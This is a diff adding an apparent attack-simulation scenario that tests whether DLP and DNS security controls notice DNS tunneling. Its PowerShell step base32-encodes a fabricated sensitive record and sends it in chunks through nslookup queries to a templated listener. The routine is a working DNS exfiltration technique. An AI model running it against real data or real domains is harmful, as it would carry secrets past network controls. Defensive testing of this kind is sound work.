@@ -1,0 +1,103 @@
+id: dlp-exfiltration-dns-tunnel
+name: DLP Exfiltration Validation — DNS Tunneling Channel
+description: >
+  Attempts to exfiltrate the same synthetic multi-type sensitive record
+  used by dlp-exfiltration-validation.yaml and
+  dlp-exfiltration-sink-https.yaml (fabricated PAN, Aadhaar, SWIFT/BIC,
+  UPI VPA, and credit-card patterns), this time by base32-encoding it
+  into a sequence of DNS query labels ("DNS tunneling") rather than an
+  HTTP body -- a protocol-distinct exfiltration technique that tests
+  whether network-layer controls (DLP, IDS/IPS, DNS security products)
+  catch data leaving via DNS queries specifically, independent of any
+  HTTP content-inspection capability.
+
+  Second channel of the sink-verified generation of DLP testing (see
+  docs/superpowers/specs/2026-08-19-dns-tunneling-exfiltration-channel-design.md).
+  Verdict comes from whether the platform's own purpose-built DNS
+  listener (internal/dnssink, bound to UDP/53) fully reassembles the
+  encoded payload from the query sequence -- ground truth for whether
+  the data left via DNS, not an inference from a local check.
+  Deliberately its own standalone scenario, matching the same reasoning
+  dlp-exfiltration-sink-https.yaml already established for keeping each
+  verification model in its own file.
+
+  Safety: all synthetic data is fabricated ([BAS-SIM-DLP] tagged), never
+  real. The DNS listener stores only a hash of the reassembled payload,
+  never the raw content, and every query receives a fixed, harmless
+  NOERROR response (RFC 5737 documentation-only IP) so no real DNS
+  infrastructure is ever queried. Windows only.
+author: Audspect Research
+executable: true
+supported_os: [windows]
+tags:
+  - dlp
+  - data-protection-validation
+  - exfiltration
+  - dns-tunneling
+  - windows
+  - mitre-attack
+  - bfsi
+  - india
+mitre_phases:
+  - collection
+  - exfiltration
+  - command-and-control
+
+steps:
+  - name: "DLP Validation — DNS Tunneling Exfiltration (T1071.004)"
+    technique_id: T1071.004
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Issues a sequence of nslookup queries against the platform's own DNS listener (this same on-prem orchestrator, UDP/53) carrying a base32-encoded synthetic sensitive record split across query labels. No real DNS infrastructure is queried and no data leaves the environment -- the destination is this same on-prem deployment."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 22: DNS query, high volume of short-lived subdomain queries to the orchestrator's own DNS listener"
+      - "Sysmon EID 3: UDP port 53 to the orchestrator's own address"
+    detection:
+      - "DLP/network: outbound DNS query volume/entropy matching data-exfiltration-via-DNS patterns"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      function ConvertTo-Base32([byte[]]$Bytes) {
+        $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'
+        $bits = ''
+        foreach ($b in $Bytes) { $bits += [Convert]::ToString($b, 2).PadLeft(8, '0') }
+        $result = ''
+        for ($i = 0; $i -lt $bits.Length; $i += 5) {
+          $chunkBits = $bits.Substring($i, [Math]::Min(5, $bits.Length - $i)).PadRight(5, '0')
+          $result += $alphabet[[Convert]::ToInt32($chunkBits, 2)]
+        }
+        return $result
+      }
+      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
+      $payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($csvContent)
+      $encoded = ConvertTo-Base32 $payloadBytes
+      $chunkSize = 52
+      $chunks = @()
+      for ($i = 0; $i -lt $encoded.Length; $i += $chunkSize) {
+        $chunks += $encoded.Substring($i, [Math]::Min($chunkSize, $encoded.Length - $i))
+      }
+      $sent = 0
+      try {
+        nslookup "000.$($chunks.Count).{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}}" {{SINK_DNS_SERVER}} 2>&1 | Out-Null
+        for ($i = 0; $i -lt $chunks.Count; $i++) {
+          $seq = "{0:D3}" -f ($i + 1)
+          nslookup "$seq.$($chunks[$i]).{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}}" {{SINK_DNS_SERVER}} 2>&1 | Out-Null
+          $sent++
+        }
+        Write-Output "EXEC T1071.004: multi-type sensitive record split into $($chunks.Count) DNS-tunneled chunks, $sent query(ies) sent. [BAS-SIM-DLP-DNS-TUNNEL]"
+      } catch {
+        Write-Output "EXEC T1071.004: DNS tunneling exfiltration attempt failed after $sent of $($chunks.Count) chunk(s). [BAS-SIM-DLP-DNS-TUNNEL]"
+      }
+      # No local DLP_OBSERVATION marker here -- this step's verdict comes
+      # entirely from whether the DNS listener fully reassembled the
+      # campaign, resolved server-side by internal/dnssink +
+      # internal/verifysync, not from anything this script can locally
+      # confirm.
+    cleanup: ""
